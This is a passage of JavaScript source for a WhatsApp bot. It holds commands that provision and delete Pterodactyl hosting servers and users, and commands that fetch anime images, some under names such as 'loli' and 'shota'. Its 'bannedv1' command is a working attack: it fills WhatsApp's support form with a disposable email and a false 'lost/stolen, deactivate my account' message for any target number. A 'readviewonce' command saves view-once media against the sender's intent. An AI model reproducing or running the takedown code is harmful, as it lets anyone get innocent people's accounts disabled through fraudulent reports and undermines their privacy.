if (!isCreator) return m.reply('Khusus Developer')          
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "9000"
let cpu = "270"
let disk = "9000"
let email = username + "@𝙒𝙖𝙣.𝙊𝙛𝙛𝙘𝙞𝙖𝙡"
akunlo = "https://files.catbox.moe/24p794.mp4" 
if (!u) return
let d = (await Al.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Sedang Membuat Server....*`)
ctf = `*DATA AKUN SERVER PANNEL ANDA*
> ╔─❐
> ┣⎙─➤ Username : ${user.username}
> ┣⎙─➤ Password : ${password.toString()}
> ┣⎙─➤ Login : ${domain}
> ┣⎙─➤ Server : ${namaowner}
> ┗⬣

_NOTE_
*SIMPAN DATA PANEL ANDA KARENA OWNER HANYA SEKALI MENGIRIMKAN DATA & JIKA KEHILANGAN ITU BUKAN TANGGUNG JAWAB OWNER*`
Al.sendMessage(u, {text: `${ctf}`}, {quoted:m})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PAKET 9GB",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SERVER TELAH DI BUAT✅*

ID USER : ${user.id}
ID SERVER : ${server.id}
RAM : 9000
DISK : 9000
CPU 270%

*USR & PASSWORD TELAH DI KIRIM KE*
*PRIVATE MESSAGE ! SILAHKAN DI CEK*`)

}
limitAdd(m.sender, limit)
break 
case "10gb": {
if (!isCreator) return m.reply('Khusus Developer')          
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "10000"
let cpu = "300"
let disk = "10000"
let email = username + "@𝙒𝙖𝙣.𝙊𝙛𝙛𝙘𝙞𝙖𝙡"
akunlo = "https://files.catbox.moe/24p794.mp4" 
if (!u) return
let d = (await Al.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Sedang Membuat Server....*`)
ctf = `*DATA AKUN SERVER PANNEL ANDA*
> ╔─❐
> ┣⎙─➤ Username : ${user.username}
> ┣⎙─➤ Password : ${password.toString()}
> ┣⎙─➤ Login : ${domain}
> ┣⎙─➤ Server : ${namaowner}
> ┗⬣

_NOTE_
*SIMPAN DATA PANEL ANDA KARENA OWNER HANYA SEKALI MENGIRIMKAN DATA & JIKA KEHILANGAN ITU BUKAN TANGGUNG JAWAB OWNER*`
Al.sendMessage(u, {text: `${ctf}`}, {quoted:m})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PAKET 10GB",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SERVER TELAH DI BUAT✅*

ID USER : ${user.id}
ID SERVER : ${server.id}
RAM : 10000
DISK : 10000
CPU 300%

*USR & PASSWORD TELAH DI KIRIM KE*
*PRIVATE MESSAGE ! SILAHKAN DI CEK*`)

}
limitAdd(m.sender, limit)
break 
case "unli": {
if (!isCreator) return m.reply('Khusus Developer')          
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@𝙒𝙖𝙣.𝙊𝙛𝙛𝙘𝙞𝙖𝙡"
akunlo = "https://files.catbox.moe/24p794.mp4" 
if (!u) return
let d = (await Al.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Sedang Membuat Server....*`)
ctf = `*DATA AKUN SERVER PANNEL ANDA*
> ╔─❐
> ┣⎙─➤ Username : ${user.username}
> ┣⎙─➤ Password : ${password.toString()}
> ┣⎙─➤ Login : ${domain}
> ┣⎙─➤ Server : ${namaowner}
> ┗⬣

_NOTE_
*SIMPAN DATA PANEL ANDA KARENA OWNER HANYA SEKALI MENGIRIMKAN DATA & JIKA KEHILANGAN ITU BUKAN TANGGUNG JAWAB OWNER*`
Al.sendMessage(u, {text: `${ctf}`}, {quoted:m})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PAKET UNLI",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SERVER TELAH DI BUAT✅*

ID USER : ${user.id}
ID SERVER : ${server.id}
RAM : unli
DISK : unli
CPU 0%

*USR & PASSWORD TELAH DI KIRIM KE*
*PRIVATE MESSAGE ! SILAHKAN DI CEK*`)

}
limitAdd(m.sender, limit)
break 
        case "listsrv": {
  if (!isCreator) return m.reply(`Lu Bukan Owner Bngst`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Al.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
limitAdd(m.sender, limit)
break
         case "listusr": {
  if (!isCreator) return m.reply('Malu Anjing Lu Bukan Bg 𝙈𝘼𝙉𝙐𝙇')
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Al.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
limitAdd(m.sender, limit)
break
        case "delsrv": {
      if (!isCreator) return m.reply(`Khusus Developer`)

let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*SERVER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case "delusr": {
  if (!isCreator) return m.reply(`Khusus Developer`)
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE USER*')
}
break 
//================
case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      Al.sendMessage(m.chat, {image:  imageBuffer, caption: `𝗠𝗔𝗡𝗨-𝗠𝗗`}, {quoted: m})    
            }
            break
case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      Al.sendMessage(m.chat, {image:  imageBuffer, caption: `𝗠𝗔𝗡𝗨-𝗠𝗗`}, {quoted: m})    
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      Al.sendMessage(m.chat, {image:  imageBuffer, caption: `𝗠𝗔𝗡𝗨-𝗠𝗗`}, {quoted: m})    
            }
            break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
reply(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
Al.sendMessage(m.chat, { image: { url: yeha }, caption : '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~' }, { quoted: m })
}
break
//================
case 'bannedv1': {
 if (!isCreator) return m.reply('Special For Owner Features!')
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`Succes ${command} Ke Nomor Tersebut\n
*NOTE :*
Harap Jeda 24 Jam...`)
            }
            break
            case 'readvo': case 'readviewonce': case 'r': {
            if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.quoted) return m.reply('Reply gambar/video yang ingin Anda lihat')
  if (m.quoted.mtype !== 'viewOnceMessageV2') return m.reply('Ini bukan pesan view-once.')
  let msg = m.quoted.message
  let type = Object.keys(msg)[0]
  let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
  let buffer = Buffer.from([])
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk])
  }
  if (/video/.test(type)) {
    return Al.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
  } else if (/image/.test(type)) {
    return Al.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
  }
}
limitAdd(m.sender, limit)
break
//=======================
case 'list': case 'store':{
if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return m.reply(`Belum ada list message yang terdaftar di group ini`)
